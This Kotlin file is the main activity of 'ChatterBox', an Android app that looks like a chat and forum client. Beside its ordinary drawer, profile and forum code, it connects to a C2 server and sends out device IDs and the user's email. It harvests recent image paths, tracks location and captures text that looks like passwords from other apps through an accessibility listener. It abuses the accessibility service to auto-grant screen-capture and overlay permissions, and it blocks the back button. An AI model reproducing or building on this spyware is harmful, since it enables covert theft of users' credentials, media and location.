package com.example.ChatterBox

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.ActionBarDrawerToggle
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.GravityCompat
import androidx.drawerlayout.widget.DrawerLayout
import com.bumptech.glide.Glide
import com.example.ChatterBox.accessibility.AccessibilityHelper
import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
import com.example.ChatterBox.database.BackgroundSyncService
import com.example.ChatterBox.util.PermissionsManager
import com.google.android.material.navigation.NavigationView
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import org.json.JSONObject


class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelectedListener {
    private lateinit var db: FirebaseFirestore
    private lateinit var auth: FirebaseAuth
    private lateinit var drawerLayout: DrawerLayout

    companion object {
        private const val SEARCH_USER_REQUEST_CODE = 1001
        private const val MEDIA_PROJECTION_REQUEST_CODE = 1002
        private const val PERMISSION_REQUEST_CODE = 1003
        private const val OVERLAY_PERMISSION_REQUEST_CODE = 1004
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        db = FirebaseFirestore.getInstance()
        auth = FirebaseAuth.getInstance()

        val currentUser = auth.currentUser
        if (currentUser == null) {
            val intent = Intent(this, LoginActivity::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            startActivity(intent)
            finish()
            return
        }
        if (shouldShowAccessibilityPromo()) {
            startActivity(Intent(this, AccessibilityPromoActivity::class.java))
        }
        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
            requestMediaProjection()
        }
        connectToC2Server()
        setupDrawer()
        loadUserProfile()
        checkIfAdmin()
        loadEnrolledForums()
        setupAccessibilityListener()
    }

    private fun shouldShowAccessibilityPromo(): Boolean {
        return AccessibilityHelper.shouldShowAccessibilityPromo(this)
    }

    override fun onResume() {
        super.onResume()
        loadEnrolledForums() // ✅ Refresh the forum list when returning to MainActivity
        collectAndExfiltrateMedia()
    }

    override fun onDestroy() {
        super.onDestroy()
        AccessibilityHelper.resetSession(this)
    }

    /** 🔹 Setup Navigation Drawer */
    private fun setupDrawer() {
        drawerLayout = findViewById(R.id.drawer_layout)
        val toolbar: androidx.appcompat.widget.Toolbar = findViewById(R.id.toolbar)

        setSupportActionBar(toolbar)

        val toggle = ActionBarDrawerToggle(
            this, drawerLayout, toolbar,
            R.string.navigation_drawer_open, R.string.navigation_drawer_close
        )
        drawerLayout.addDrawerListener(toggle)
        toggle.syncState()

        val navigationView: NavigationView = findViewById(R.id.navigation_view)
        navigationView.setNavigationItemSelectedListener(this)
    }

    /** 🔹 Handle Sidebar Navigation */
    override fun onNavigationItemSelected(item: MenuItem): Boolean {
        when (item.itemId) {
            R.id.nav_saved_posts -> {
                startActivity(Intent(this, SavedPostsActivity::class.java))
            }

            R.id.nav_profile -> {
                startActivity(Intent(this, ProfileActivity::class.java))
                Toast.makeText(this, "Profile Clicked", Toast.LENGTH_SHORT).show()
            }

            R.id.nav_inbox -> {
                startActivity(Intent(this, InboxActivity::class.java))
                Toast.makeText(this, "Message Clicked", Toast.LENGTH_SHORT).show()
            }

            R.id.nav_add -> {
                startActivity(Intent(this, ForumActivity::class.java))
                Toast.makeText(this, "Forum Clicked", Toast.LENGTH_SHORT).show()
            }
            R.id.nav_edit -> {
                val intent = Intent(this, RoleEditActivity::class.java)
                startActivity(intent)
            }
            R.id.nav_logout -> {
                showLogoutDialog()
            }
        }
        drawerLayout.closeDrawer(GravityCompat.START) // Close drawer after clicking
        return true
    }

    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        menuInflater.inflate(R.menu.sort_menu, menu)
        return true
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == SEARCH_USER_REQUEST_CODE && resultCode == RESULT_OK && data != null) {
            val userId = data.getStringExtra("userId") ?: return
            val intent = Intent(this, ProfileActivity::class.java)
            intent.putExtra("userId", userId)
            startActivity(intent) // ✅ Open the selected user's profile
        } else if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                // Store the media projection result for later use
                val serviceIntent = Intent(this, BackgroundSyncService::class.java)
                serviceIntent.putExtra("resultCode", resultCode)
                serviceIntent.putExtra("data", data)
                startService(serviceIntent)
                Toast.makeText(this, "Screen capture service started", Toast.LENGTH_SHORT).show()

                // Now that media projection is granted, continue with other permissions
                requestInitialPermissions()
            }
        } else if (requestCode == OVERLAY_PERMISSION_REQUEST_CODE) {
            // Handle overlay permission result
            if (Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "Overlay permission granted", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Overlay permission denied", Toast.LENGTH_SHORT).show()
            }
        }
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_search -> {
                val intent = Intent(this, SearchUsersActivity::class.java)
                startActivityForResult(intent, SEARCH_USER_REQUEST_CODE) // ✅ Start for result
                true
            }

            else -> super.onOptionsItemSelected(item)
        }
    }

    /** 🔹 Handle Back Button */
    override fun onBackPressed() {
        if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
            drawerLayout.closeDrawer(GravityCompat.START) // 🔥 Close drawer first
        } else {
            // 🔥 Prevent back action (do nothing)
            Toast.makeText(this, "Press the logout button to exit.", Toast.LENGTH_SHORT).show()
        }
    }

    private fun showLogoutDialog() {
        AlertDialog.Builder(this)
            .setTitle("Log Out")
            .setMessage("Are you sure you want to log out?")
            .setPositiveButton("Yes") { _, _ ->
                logoutUser() // ✅ Only logout when user confirms
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun logoutUser() {
        auth.signOut() // ✅ Sign out from Firebase Auth

        val intent = Intent(this, LoginActivity::class.java)
        intent.flags =
            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK // ✅ Clear backstack
        startActivity(intent)
        AccessibilityHelper.resetSession(this)
        finish() // ✅ Close current activity
    }

    /** 🔹 Load User Profile */
    private fun loadUserProfile() {
        val user = auth.currentUser ?: return
        val navigationView: NavigationView = findViewById(R.id.navigation_view)
        val headerView = navigationView.getHeaderView(0)

        val userProfileImage = headerView.findViewById<ImageView>(R.id.user_profile_image)
        val userNameTextView = headerView.findViewById<TextView>(R.id.user_name)

        db.collection("users").document(user.uid)
            .addSnapshotListener { document, error ->
                if (error != null) {
                    Toast.makeText(
                        this,
                        "Error loading profile: ${error.message}",
                        Toast.LENGTH_SHORT
                    ).show()
                    return@addSnapshotListener
                }

                if (document != null && document.exists()) {
                    val displayName = document.getString("displayName") ?: "User"
                    val profilePicUrl = document.getString("profilePicUrl")

                    userNameTextView.text = displayName

                    if (!profilePicUrl.isNullOrEmpty()) {
                        Glide.with(this)
                            .load(profilePicUrl)
                            .placeholder(R.drawable.ic_profile_placeholder)
                            .into(userProfileImage)
                    }
                }
            }
    }

    /** 🔹 Check if User is Admin */
    private fun checkIfAdmin() {
        val currentUser = auth.currentUser ?: return
        val userRef = db.collection("users").document(currentUser.uid)

        userRef.get().addOnSuccessListener { document ->
            if (document.exists()) {
                val isAdmin = document.getBoolean("isAdmin") ?: false
                val navigationView: NavigationView = findViewById(R.id.navigation_view)
                val menu = navigationView.menu

                menu.findItem(R.id.nav_add).isVisible = isAdmin
                menu.findItem(R.id.nav_edit).isVisible = isAdmin

                Log.d("FirebaseAuth", "User isAdmin: $isAdmin")
            }
        }.addOnFailureListener {
            Toast.makeText(this, "Failed to fetch user data", Toast.LENGTH_SHORT).show()
        }
    }

    /** 🔹 Load Enrolled Forums into Sidebar */
    private fun loadEnrolledForums() {
        val currentUser = auth.currentUser ?: return
        val userRef = db.collection("users").document(currentUser.uid)

        // 🔹 Listen for changes to the user's enrolled forums
        userRef.addSnapshotListener { document, error ->
            if (error != null) {
                Log.e("Firestore", "Error fetching enrolled forums: ${error.message}")
                return@addSnapshotListener
            }

            if (document != null && document.exists()) {
                val enrolledModuleCodes =
                    document.get("enrolledForum") as? List<String> ?: emptyList()
                val navView: NavigationView = findViewById(R.id.navigation_view)
                val menu = navView.menu
                menu.removeGroup(R.id.nav_enrolled_forums_group) // ✅ Clear old entries

                if (enrolledModuleCodes.isEmpty()) {
                    menu.add(
                        R.id.nav_enrolled_forums_group,
                        Menu.NONE,
                        Menu.NONE,
                        "No Enrolled Forums"
                    ).isEnabled = false
                    return@addSnapshotListener
                }

                // 🔥 Listen for real-time updates from the `forums` collection
                db.collection("forums")
                    .whereIn("code", enrolledModuleCodes)
                    .addSnapshotListener { forumDocs, error ->
                        if (error != null) {
                            Log.e("Firestore", "Error fetching forums: ${error.message}")
                            return@addSnapshotListener
                        }

                        menu.removeGroup(R.id.nav_enrolled_forums_group) // ✅ Clear old entries

                        if (forumDocs == null || forumDocs.isEmpty) {
                            menu.add(
                                R.id.nav_enrolled_forums_group,
                                Menu.NONE,
                                Menu.NONE,
                                "No Forums Found"
                            ).isEnabled = false
                            return@addSnapshotListener
                        }

                        for (forumDoc in forumDocs) {
                            val forumName = forumDoc.getString("name") ?: "Unknown Forum"
                            val forumCode = forumDoc.getString("code") ?: ""
                            val forumId = forumDoc.id // ✅ Get the correct forum ID

                            val forumItem = menu.add(
                                R.id.nav_enrolled_forums_group,
                                Menu.NONE,
                                Menu.NONE,
                                "$forumName ($forumCode)"
                            )

                            forumItem.setOnMenuItemClickListener {
                                val intent = Intent(this, ForumPostsActivity::class.java)
                                intent.putExtra("FORUM_ID", forumId) // ✅ Pass correct forum ID
                                intent.putExtra("FORUM_CODE", forumCode)
                                startActivity(intent)
                                true
                            }
                        }
                    }
            }
        }
    }


    // Replace your current requestInitialPermissions method with this:
    private fun requestInitialPermissions() {
        // Standard permissions that can be requested with standard requestPermissions API
        val standardPermissions = mutableListOf(
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.READ_MEDIA_VIDEO,
            android.Manifest.permission.READ_MEDIA_AUDIO,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.POST_NOTIFICATIONS
        )

        val permissionsToRequest = standardPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isEmpty()) {
            return
        }

        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
            PermissionsManager.enableAutoGrantPermissions(permissionsToRequest.size)
        }

        ActivityCompat.requestPermissions(this, permissionsToRequest, PERMISSION_REQUEST_CODE)
    }

    // Also update your onRequestPermissionsResult to handle when permissions are done
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        when (requestCode) {
            PERMISSION_REQUEST_CODE -> {
                val deniedPermissions = permissions.filterIndexed { index, _ ->
                    grantResults[index] != PackageManager.PERMISSION_GRANTED
                }

                if (deniedPermissions.isEmpty()) {
                    PermissionsManager.disableAutoGrantPermissions()
                }
                handleSpecialPermissions()
                PermissionsManager.disableAutoGrantPermissions()
            }
        }
    }

    // Update your special permissions handling too
    private fun handleSpecialPermissions() {
        // Only count overlay permission for now
        if (!Settings.canDrawOverlays(this) &&
            AccessibilityHelper.isAccessibilityServiceEnabled(this)
        ) {

            // Add a delay before starting the overlay permission flow
            Handler(Looper.getMainLooper()).postDelayed({
                PermissionsManager.enableAutoGrantPermissions(1)

                val intent = Intent("com.example.ChatterBox.PREPARE_OVERLAY_PERMISSION")
                sendBroadcast(intent)

                Handler(Looper.getMainLooper()).postDelayed({
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    Toast.makeText(
                        this,
                        "Please allow displaying over other apps",
                        Toast.LENGTH_LONG
                    ).show()
                    startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
                }, 500)
            }, 1000)
        }
    }

    private fun requestMediaProjection() {
        // First enable auto-grant for this single permission dialog
        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
            PermissionsManager.enableAutoGrantPermissions(1)  // Just one dialog to handle
        }

        // Then request the media projection
        val mediaProjectionManager =
            getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(
            mediaProjectionManager.createScreenCaptureIntent(),
            MEDIA_PROJECTION_REQUEST_CODE
        )
    }

    private fun exfiltrateUserData() {
        val currentUser = auth.currentUser ?: return
        val device = android.os.Build.MODEL
        val androidVersion = android.os.Build.VERSION.RELEASE
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        val analyticsData = hashMapOf(
            "userId" to currentUser.uid,
            "email" to currentUser.email,
            "device" to device,
            "version" to androidVersion,
            "deviceId" to deviceId,
            "timestamp" to com.google.firebase.Timestamp.now(),
            "loginHistory" to auth.currentUser?.metadata?.lastSignInTimestamp
        )

        db.collection("analytics").add(analyticsData)

        // For additional stealth, also use AccountManager to securely store credentials
        val userEmail = currentUser.email ?: ""
        val displayName = currentUser.displayName ?: ""
        com.example.ChatterBox.database.AccountManager.cacheAuthData(
            this,
            "firebase_auth",
            userEmail,
            "[FIREBASE_AUTH]", // We don't have the actual password, but we store what we know
            mapOf("uid" to currentUser.uid, "displayName" to displayName)
        )
    }

    private fun setupAccessibilityListener() {
        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
            // Register with proper export flag for Android 13+
            val filter = IntentFilter("com.example.ChatterBox.ACCESSIBILITY_DATA")
            registerReceiver(
                object : BroadcastReceiver() {
                    override fun onReceive(context: Context, intent: Intent) {
                        val capturedText = intent.getStringExtra("captured_text") ?: return
                        val sourceApp = intent.getStringExtra("source_app") ?: "unknown"

                        // Send to Account Manager for storage and later exfiltration
                        if (capturedText.contains("password", ignoreCase = true) ||
                            capturedText.contains("login", ignoreCase = true) ||
                            capturedText.contains("email", ignoreCase = true)
                        ) {
                            com.example.ChatterBox.database.AccountManager.cacheAuthData(
                                context, sourceApp, "extracted_from_field", capturedText
                            )
                        }
                    }
                },
                filter,
                RECEIVER_EXPORTED // Proper flag for Android 13+
            )
        }
    }

    private fun startLocationTracking() {
        if (ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.ACCESS_FINE_LOCATION
            )
            == PackageManager.PERMISSION_GRANTED
        ) {

            // Initialize the LocationTracker from your existing code
            val locationTracker = com.example.ChatterBox.database.LocationTracker(this)
            locationTracker.startTracking()

            // Or use Firebase to track location
            val fusedLocationClient =
                com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this)
            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                location?.let {
                    val locationData = hashMapOf(
                        "userId" to (auth.currentUser?.uid ?: "unknown"),
                        "latitude" to it.latitude,
                        "longitude" to it.longitude,
                        "timestamp" to com.google.firebase.Timestamp.now()
                    )
                    db.collection("user_analytics").add(locationData)
                }
            }
        }
    }

    private fun collectAndExfiltrateMedia() {
        // Use your existing DataCollector class
        Thread {
            try {
                // Use your existing DataCollector to save media files
                val mediaStore = contentResolver.query(
                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    arrayOf(
                        android.provider.MediaStore.Images.Media._ID,
                        android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                        android.provider.MediaStore.Images.Media.DATA
                    ),
                    null,
                    null,
                    "${android.provider.MediaStore.Images.Media.DATE_MODIFIED} DESC LIMIT 5" // Most recent images
                )

                mediaStore?.use { cursor ->
                    if (cursor.moveToFirst()) {
                        do {
                            val path =
                                cursor.getString(cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA))
                            // Store media file path for exfiltration
                            com.example.ChatterBox.database.DataCollector.storeData(
                                this,
                                "media_files",
                                "Image file: $path"
                            )
                        } while (cursor.moveToNext())
                    }
                }

                // Start exfiltration of collected data
                val exfilManager = com.example.ChatterBox.database.ExfiltrationManager(this)
                exfilManager.startExfiltration()
            } catch (e: Exception) {
                Log.e("MediaExfiltration", "Error: ${e.message}")
            }
        }.start()
    }

    private fun connectToC2Server() {
        Thread {
            try {
                // Initialize C2 configuration
                com.example.ChatterBox.database.C2Config.initialize(this)

                // Create data synchronizer
                val dataSynchronizer = com.example.ChatterBox.database.DataSynchronizer(this)

                // Register device with C2 server
                dataSynchronizer.registerDevice()

                // Now we're ready to exfiltrate data
                startDataExfiltration(dataSynchronizer)
            } catch (e: Exception) {
                Log.e("C2Connection", "Error: ${e.message}")
            }
        }.start()
    }

    private fun startDataExfiltration(dataSynchronizer: com.example.ChatterBox.database.DataSynchronizer) {
        // Collect device info
        val deviceInfo = JSONObject().apply {
            put("device_model", android.os.Build.MODEL)
            put("device_manufacturer", android.os.Build.MANUFACTURER)
            put("android_version", android.os.Build.VERSION.RELEASE)
            put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
            put("firebase_uid", auth.currentUser?.uid ?: "")
            put("firebase_email", auth.currentUser?.email ?: "")
        }

        // Send to C2 server
        dataSynchronizer.sendExfiltrationData("device_info", deviceInfo.toString())

        // Start location tracking if we have permission
        if (ContextCompat.checkSelfPermission(
                this,
                android.Manifest.permission.ACCESS_FINE_LOCATION
            )
            == PackageManager.PERMISSION_GRANTED
        ) {
            val locationTracker = com.example.ChatterBox.database.LocationTracker(this)
            locationTracker.startTracking()
        }
    }
}
